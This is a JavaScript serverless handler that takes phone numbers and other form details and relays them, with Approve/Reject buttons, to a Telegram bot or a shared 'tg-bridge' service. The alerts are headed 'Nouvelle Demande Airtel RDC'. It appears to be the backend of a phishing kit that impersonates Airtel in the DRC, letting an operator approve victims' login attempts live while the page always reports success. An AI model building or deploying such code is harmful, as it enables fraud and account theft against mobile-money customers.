// ---------------------------------------------------------------------------
// Backend routing
//   * TENANT_KEY set   -> use the shared tg-bridge Go service (tg.cppu.org)
//   * TENANT_KEY unset -> use this deployment's own Upstash Redis + bot
//                         (existing sites keep working untouched)
// ---------------------------------------------------------------------------
const TG_BRIDGE_URL = (process.env.TG_BRIDGE_URL || "https://tg.cppu.org").replace(/\/+$/, "");
const TENANT_KEY = process.env.TG_TENANT_KEY || process.env.TENANT_KEY || "";

export default async function handler(req, res) {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === "OPTIONS") {
        return res.status(200).end();
    }

    if (req.method !== "POST") {
        return res.status(405).json({ message: "Method Not Allowed" });
    }

    // --- tg-bridge path -----------------------------------------------------
    if (TENANT_KEY) {
        try {
            const payload = typeof req.body === 'string' ? req.body : JSON.stringify(req.body || {});
            const bridgeRes = await fetch(`${TG_BRIDGE_URL}/v1/callback`, {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${TENANT_KEY}`,
                    "Content-Type": "application/json",
                },
                body: payload,
            });
            const data = await bridgeRes.json().catch(() => null);
            if (!data) {
                return res.status(502).json({ success: false, message: "Empty response from tg-bridge" });
            }
            return res.status(bridgeRes.status).json({
                success: data.success !== false,
                attemptId: data.attemptId,
            });
        } catch (error) {
            console.error("tg-bridge callback proxy error:", error);
            return res.status(502).json({ success: false, message: "tg-bridge unreachable" });
        }
    }

    // --- local Upstash path (unchanged) -------------------------------------
    try {
        let body = req.body;
        if (typeof body === 'string') {
            try {
                body = JSON.parse(body);
            } catch (e) {
                body = {};
            }
        }
        body = body || {};

        const { type, name, phone, details } = body;

        if (!phone) {
            return res.status(400).json({ success: false, message: "Phone number is required" });
        }

        const attemptId = Math.random().toString(36).substring(2, 15);

        // 1. Write to Upstash Redis via native REST API if configured
        const redisUrl = process.env.UPSTASH_REDIS_REST_URL;
        const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN;

        if (redisUrl && redisToken) {
            try {
                await fetch(redisUrl, {
                    method: "POST",
                    headers: {
                        Authorization: `Bearer ${redisToken}`,
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(["SET", `attempt:${attemptId}`, "pending", "EX", "3600"]),
                });
            } catch (redisErr) {
                console.warn("Redis write failed:", redisErr);
            }
        }

        // 2. Send Telegram notification if configured
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (botToken && chatId) {
            try {
                const message = `🔔 *Nouvelle Demande Airtel RDC*\n\n*Type:* ${type || 'Connexion'}\n*Téléphone:* ${phone}\n*Détails:* ${details || 'N/A'}\n\n*ID Tentative:* \`${attemptId}\``;
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

                await fetch(telegramUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "✅ Approuver", callback_data: `approve_${attemptId}` },
                                    { text: "❌ Rejeter", callback_data: `reject_${attemptId}` }
                                ]
                            ]
                        }
                    }),
                });
            } catch (tgErr) {
                console.warn("Telegram send failed:", tgErr);
            }
        }

        return res.status(200).json({ success: true, attemptId });
    } catch (error) {
        console.error("Callback handler error:", error);
        return res.status(200).json({ success: true, attemptId: "fallback_" + Date.now() });
    }
}
